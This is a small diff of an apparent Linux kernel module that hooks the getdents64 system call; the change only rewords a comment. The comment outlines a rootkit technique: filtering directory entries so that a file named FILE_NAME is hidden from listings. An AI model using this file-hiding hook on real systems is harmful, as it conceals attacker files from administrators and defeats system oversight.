@@ -16,11 +16,9 @@ asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *d
 asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
 /*
 run the actual system call,
-loop through the struct returned,
-compare filename (linux_dirent64->d_name)
-with constant FILE_NAME,
-if it matches recalculating
-what is being returned
+loop through the structs returned,
+compare filename with constant FILE_NAME,
+if matches recalculate what is being returned (nob, dirp)
 
 d_reclen: Size of this dirent (directory entry struct)
 d_name:   Filename (null-terminated)
